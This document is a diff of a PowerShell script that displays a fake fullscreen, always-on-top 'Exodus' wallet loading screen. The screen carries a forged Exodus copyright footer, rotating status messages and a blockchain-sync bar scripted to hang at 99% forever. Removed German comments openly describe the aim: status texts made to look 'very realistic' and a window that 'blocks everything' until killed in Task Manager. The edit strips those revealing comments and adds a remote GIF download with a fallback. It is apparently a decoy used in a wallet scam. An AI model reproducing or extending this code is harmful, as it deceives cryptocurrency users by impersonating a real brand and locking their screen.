@@ -6,26 +6,27 @@ Add-Type -AssemblyName System.Drawing
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus"
 $form.WindowState = "Maximized"
-$form.FormBorderStyle = "None"          # Kein Rahmen, keine Taskleiste verschwindet fast
+$form.FormBorderStyle = "None"          # Kein Rahmen
 $form.TopMost = $true
 $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
-$form.BackColor = [System.Drawing.Color]::FromArgb(18,18,26)  # Original Exodus Dark
+$form.BackColor = [System.Drawing.Color]::FromArgb(18,18,26)  # Exodus Dark
 $form.ForeColor = "White"
 
-# ==================== EXODUS LOADING GIF ====================
+# ==================== EXODUS LOADING GIF (ONLINE) ====================
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.SizeMode = "Zoom"
 $pictureBox.Dock = "Top"
 $pictureBox.Height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height / 2
 
-
+# GIF direkt aus GitHub RAW laden
 $gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
-$webclient = New-Object System.Net.WebClient
-$bytes = $webclient.DownloadData($gifUrl)
-$stream = New-Object System.IO.MemoryStream($bytes)
-$pictureBox.Image = [System.Drawing.Image]::FromStream($stream)
-else {
-    # Fallback: groÃŸes Exodus-Text-Logo
+try {
+    $webclient = New-Object System.Net.WebClient
+    $bytes = $webclient.DownloadData($gifUrl)
+    $stream = New-Object System.IO.MemoryStream($bytes)
+    $pictureBox.Image = [System.Drawing.Image]::FromStream($stream)
+} catch {
+    # Fallback: Textlogo
     $logoLabel = New-Object System.Windows.Forms.Label
     $logoLabel.Text = "EXODUS"
     $logoLabel.Font = New-Object System.Drawing.Font("Arial Black", 72, [System.Drawing.FontStyle]::Bold)
@@ -57,7 +58,7 @@ $statusLabel.TextAlign = "MiddleCenter"
 $statusLabel.Text = "Initializing..."
 $form.Controls.Add($statusLabel)
 
-# Blockchain Sync Prozent (hÃ¤ngt spÃ¤ter bei 99.x %)
+# Blockchain Sync Prozent
 $syncLabel = New-Object System.Windows.Forms.Label
 $syncLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16)
 $syncLabel.ForeColor = "#AAAAAA"
@@ -67,25 +68,23 @@ $syncLabel.TextAlign = "MiddleCenter"
 $syncLabel.Text = "Syncing blockchain... 0%"
 $form.Controls.Add($syncLabel)
 
-# ProgressBar 1 – Blockchain Sync (langsam hoch, bleibt bei 99.x stecken)
+# ProgressBar 1
 $progressSync = New-Object System.Windows.Forms.ProgressBar
 $progressSync.Style = "Continuous"
 $progressSync.ForeColor = "#8B5CF6"
 $progressSync.Dock = "Top"
 $progressSync.Height = 10
-$progressSync.Margin = New-Object System.Windows.Forms.Padding(80,20,80,20)
 $form.Controls.Add($progressSync)
 
-# ProgressBar 2 – Marquee wie bei Ledger/Exodus
+# ProgressBar 2 (Marquee)
 $progressMarquee = New-Object System.Windows.Forms.ProgressBar
 $progressMarquee.Style = "Marquee"
 $progressMarquee.MarqueeAnimationSpeed = 30
 $progressMarquee.Dock = "Top"
 $progressMarquee.Height = 6
-$progressMarquee.Margin = New-Object System.Windows.Forms.Padding(120,30,120,40)
 $form.Controls.Add($progressMarquee)
 
-# Version & Copyright unten
+# Footer
 $footer = New-Object System.Windows.Forms.Label
 $footer.Text = "Exodus Version 25.1.17   © 2025 Exodus Movement, Inc."
 $footer.Font = New-Object System.Drawing.Font("Segoe UI", 11)
@@ -95,7 +94,7 @@ $footer.Height = 40
 $footer.TextAlign = "MiddleCenter"
 $form.Controls.Add($footer)
 
-# ==================== SEHR REALISTISCHE STATUS-TEXTE ====================
+# ==================== STATUS & PROGRESS LOGIK ====================
 $statuses = @(
     "Initializing wallet...",
     "Connecting to secure servers...",
@@ -114,7 +113,8 @@ $statuses = @(
 )
 
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 3500   # Langsamer Wechsel = echter
+$timer.Interval = 3500
+
 $dotCount = 0
 $statusIndex = 0
 $percent = 0
@@ -125,20 +125,19 @@ $timer.Add_Tick({
     $dots = "." * $dotCount
     $loadingLabel.Text = "Loading wallet$dots"
 
-    # Status wechseln (manchmal lÃ¤nger auf einem stehen bleiben)
+    # Status ändern
     if ((Get-Random -Minimum 1 -Maximum 10) -gt 5) {
         $statusIndex = ($statusIndex + 1) % $statuses.Count
         $statusLabel.Text = $statuses[$statusIndex]
     }
 
-    # Prozent hochzÃ¤hlen – extrem realistisch (langsam, bleibt bei 99.x hÃ¤ngen)
+    # Prozent realistisch hochzählen
     if ($percent -lt 99) {
         $percent += Get-Random -Minimum 1 -Maximum 4
         if ($percent -gt 99) { $percent = 99 }
         $syncLabel.Text = "Syncing blockchain... $percent%"
         $progressSync.Value = $percent
     } elseif ($percent -eq 99) {
-        # Bei 99% zufÃ¤llig kleine SprÃ¼nge 99.1 – 99.8%, dann wieder runter oder stehen bleiben
         if ((Get-Random -Minimum 1 -Maximum 20) -eq 1) {
             $sub = Get-Random -Minimum 1 -Maximum 8
             $syncLabel.Text = "Syncing blockchain... 99.$sub%"
@@ -148,9 +147,4 @@ $timer.Add_Tick({
 
 $timer.Start()
 
-# Blockiert alles – lÃ¤uft ewig oder bis Task-Manager
-
 $form.ShowDialog() | Out-Null
-
-
-
